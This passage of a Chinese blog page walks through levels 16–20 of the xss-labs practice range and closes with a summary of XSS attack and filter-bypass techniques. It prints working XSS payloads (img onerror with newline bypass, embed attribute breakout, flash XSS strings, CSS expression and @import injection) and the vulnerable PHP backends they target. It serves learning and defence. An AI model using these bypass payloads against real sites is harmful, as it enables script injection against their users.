+<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/4-1706708530857-122.jpg" /></li>
+<li>也就是说，我们最后输入的为 <code>&lt;img%0Asrc=1%0Aonerror=alert()&gt;</code>，成功弹窗。</li>
+<li>看看后端代码：</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-14-2">    <span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-14-3">    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;keyword&quot;</span><span class="p">]);</span>
+</span><span id="__span-14-4">    <span class="nv">$str2</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;script&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+</span><span id="__span-14-5">    <span class="nv">$str3</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">,</span> <span class="nv">$str2</span><span class="p">);</span>
+</span><span id="__span-14-6">    <span class="nv">$str4</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">,</span> <span class="nv">$str3</span><span class="p">);</span>
+</span><span id="__span-14-7">    <span class="nv">$str5</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;   &quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">,</span> <span class="nv">$str4</span><span class="p">);</span>
+</span><span id="__span-14-8">    <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&quot;</span> <span class="o">.</span> <span class="nv">$str5</span> <span class="o">.</span> <span class="s2">&quot;&lt;/center&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-14-9"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-17">level-17 参数拼接<a class="headerlink" href="#level-17" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level17.php?arg01=a&amp;arg02=b</p>
+</blockquote>
+<ol>
+<li>我们先看看页面源码，发现了一个 embed 标签 ，而且里面的 src 就是我们 URL 中的东西。<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708552616-124.jpg" /></li>
+<li>那我们就尝试去闭合掉它，我们在URL的最后面加上 <code>" onmouseover='alert()'</code>，当鼠标移动到图片上面时成功弹窗。</li>
+<li>了解一下 embed 标签：</li>
+</ol>
+<blockquote>
+<p>embed 标签定义了一个容器，用来嵌入外部应用或者互动程序（插件）。</p>
+<p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会有块错误的区域。也可以绑定各种事件，比如尝试绑定一个onmouseover事件。后台看代码用了htmlspecialchars，所以直接写标签是不行的。embed标签基本不怎么用了，所以这一关就简单了解一下即可。</p>
+</blockquote>
+<ol>
+<li>后端代码：</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-15-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-15-3"><span class="k">echo</span> <span class="s2">&quot;&lt;embed src=index.png?&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;arg01&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;=&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;arg02&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot; width=100% heigth=100%&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-15-4"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-18">level-18 参数拼接<a class="headerlink" href="#level-18" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=b</p>
+</blockquote>
+<ol>
+<li>和17关一模一样</li>
+</ol>
+<h2 id="level-19-flash-xss">level-19 flash xss<a class="headerlink" href="#level-19-flash-xss" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level19.php?arg01=a&amp;arg02=b</p>
+</blockquote>
+<ol>
+<li>首先从页面源码来看，也是 embed 标签</li>
+<li>别人说：至于为啥这里不能用前面两关的方法了？是因为源码把上面漏洞闭合了,加了一对双引号，绕不出去了（只能用 " 闭合，但是 " 会被转义，无法闭合，所以即使看起来是好的，也无法弹框）</li>
+<li>后端长这样：
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-16-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-16-3"><span class="k">echo</span> <span class="s1">&#39;&lt;embed src=&quot;xsf03.swf?&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;arg01&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;=&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;arg02&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot; width=100% heigth=100%&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-16-4"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>貌似涉及到 flash 反编译啥的，我也不会，附上偷来的 payload：<code>arg01=version&amp;arg02=&lt;a href="javascript:alert(1)"&gt;123&lt;/a&gt;</code></li>
+</ol>
+<h2 id="level-20-flash-xss">level-20 flash xss<a class="headerlink" href="#level-20-flash-xss" title="Permanent link">&para;</a></h2>
+<ol>
+<li>偷来的 payload：<code>arg01=id&amp;arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(1)</code></li>
+<li>后端：</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-17-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-17-3"><span class="k">echo</span> <span class="s1">&#39;&lt;embed src=&quot;xsf04.swf?&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;arg01&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;=&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;arg02&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot; width=100% heigth=100%&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-17-4"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<ol>
+<li>大佬的文章：<a href="https://blog.csdn.net/u014029795/article/details/103217680">xss-labs 第20关</a></li>
+</ol>
+<h2 id="_1">总结<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>（小声说一句，这部分也是偷的）</p>
+<p><strong>反射型XSS测试步骤总结：</strong>
+1. 检测输入变量，确认每个 web 页面中用户可自定义的变量，如 HTTP 参数、POST 数据、隐藏表单字段值、预定义的 radio 值或选择值
+2. 分别确认每个输入变量是否存在 xss漏洞。变量输入处输入 poc，查看返回的 web页面的 html 中 poc 代码是否被过滤，浏览器是否响应 poc，若存在过滤，进行测试查看能否进行绕过。</p>
+<p><strong>XSS的攻防：</strong>
+1. 攻：利用&lt;&gt;标记，构造<code>&lt;script&gt;</code>标签可执行 javascript的xss代码。
+防：xss过滤函数需过滤<code>&lt;&gt;&lt;script&gt;&lt;/script&gt;</code>等字符。
+2. 攻：利用 html 标签属性支持 javascript:伪协议（支持标签属性的有href、lowsrc、bgsound、background、value、action、dynsrc等），执行xss代码。
+防：xss 过滤函数需过滤JavaScript等关键字。
+3. 利用 javascript 在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对 javascript 的关键字的过滤。
+4. 攻：利用html标签属性值支持ascii码，对标签属性值进行转码进行规则库的绕过。
+防：xss 过滤函数需过滤&amp;#\等字符。
+5. 利用事件处理函数，触发事件，执行xss代码。例如<code>&lt;img src='#' onerror=alert(/xss/)&gt;</code>,当浏览器响应页面时，找不到图片的地址，触发onerror事件。
+6. 攻：利用css执行javascript代码，css代码中利用expression触发xss漏洞。如下所示：</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;width: expression(alert(&#39;xss&#39;));&gt;</span>
+</span><span id="__span-18-2">
+</span><span id="__span-18-3"><span class="s">&lt;img src=&quot;</span><span class="err">#&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;xss:expression(alert(/xss/));&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-18-4">
+</span><span id="__span-18-5"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span><span class="nt">body</span><span class="w"> </span><span class="p">{</span><span class="k">background-image</span><span class="p">:</span><span class="nf">expression</span><span class="p">(</span><span class="nf">alert</span><span class="p">(</span><span class="s2">&quot;xss&quot;</span><span class="p">));}&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</span><span id="__span-18-6">
+</span><span id="__span-18-7"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;list-style-image:url(javascript:alert(&#39;xss&#39;))&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>css代码中利用@import触发xss</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><span class="p">&lt;</span><span class="nt">stytle</span><span class="p">&gt;</span>
+</span><span id="__span-19-2">
+</span><span id="__span-19-3">@import &#39;javascript:alert(&quot;XSS&quot;)&#39;;
+</span><span id="__span-19-4">
+</span><span id="__span-19-5"><span class="p">&lt;/</span><span class="nt">stytle</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>css代码中使用@import和link方式导入外部含有xss代码的样式表文件</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stytlesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://www.***.com/a.css&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-20-2">
+</span><span id="__span-20-3"><span class="p">&lt;</span><span class="nt">stytle</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>@import url(http://www.*.com/a.css);<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>防：xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字。</p>
+<ol>
+<li>利用大小写混淆、使用单引号、不使用引号、使用/插入在img src中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数</li>
+<li>利用字符编码。javascript支持unicode、escapes、十六进制、八进制等编码形式。</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      侯霖钰 AnistonH
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/AnistonH" target="_blank" rel="noopener" title="GitHub | AnistonH" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://space.bilibili.com/527117890" target="_blank" rel="noopener" title="Bilibili | 邓紫棋山西分棋" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M488.6 104.1c16.7 18.1 24.4 39.7 23.3 65.7v202.4c-.4 26.4-9.2 48.1-26.5 65.1-17.2 17-39.1 25.9-65.5 26.7H92.02c-26.45-.8-48.21-9.8-65.28-27.2C9.682 419.4.767 396.5 0 368.2V169.8c.767-26 9.682-47.6 26.74-65.7C43.81 87.75 65.57 78.77 92.02 78h29.38L96.05 52.19c-5.75-5.73-8.63-13-8.63-21.79 0-8.8 2.88-16.06 8.63-21.797C101.8 2.868 109.1 0 117.9 0q13.2 0 21.9 8.603L213.1 78h88l74.5-69.397C381.7 2.868 389.2 0 398 0q13.2 0 21.9 8.603c5.7 5.737 8.6 12.997 8.6 21.797 0 8.79-2.9 16.06-8.6 21.79L394.6 78h29.3c26.4.77 48 9.75 64.7 26.1m-38.8 69.7c-.4-9.6-3.7-17.4-10.7-23.5-5.2-6.1-14-9.4-22.7-9.8H96.05c-9.59.4-17.45 3.7-23.58 9.8-6.14 6.1-9.4 13.9-9.78 23.5v194.4c0 9.2 3.26 17 9.78 23.5s14.38 9.8 23.58 9.8H416.4c9.2 0 17-3.3 23.3-9.8s9.7-14.3 10.1-23.5zm-264.3 42.7c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2-6.2 6.3-14 9.5-23.6 9.5s-17.5-3.2-23.6-9.5-9.4-14-9.8-23.2v-33.3c.4-9.1 3.8-16.9 10.1-23.2s13.2-9.6 23.3-10c9.2.4 17 3.7 23.3 10m191.5 0c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2s-14 9.5-23.6 9.5-17.4-3.2-23.6-9.5c-7-6.3-9.4-14-9.7-23.2v-33.3c.3-9.1 3.7-16.9 10-23.2s14.1-9.6 23.3-10c9.2.4 17 3.7 23.3 10"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://AnistonH.github.io/ME/support/" target="_blank" rel="noopener" title="打赏支持" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M96 64c0-17.7 14.3-32 32-32h384c70.7 0 128 57.3 128 128s-57.3 128-128 128h-32c0 53-43 96-96 96H192c-53 0-96-43-96-96zm384 160h32c35.3 0 64-28.7 64-64s-28.7-64-64-64h-32zM32 416h512c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.sections", "navigation.prefetch", "navigation.instant.prefetch", "navigation.progress", "navigation.instant.progress", "navigation.path", "navigation.tabs", "navigation.top", "navigation.indexes", "navigation.expand", "search.suggest", "search.highlight", "content.code.copy", "content.action.view"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.56dfad97.min.js"></script>
+      
+        <script src="../../../mkdocs/javascripts/katex.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
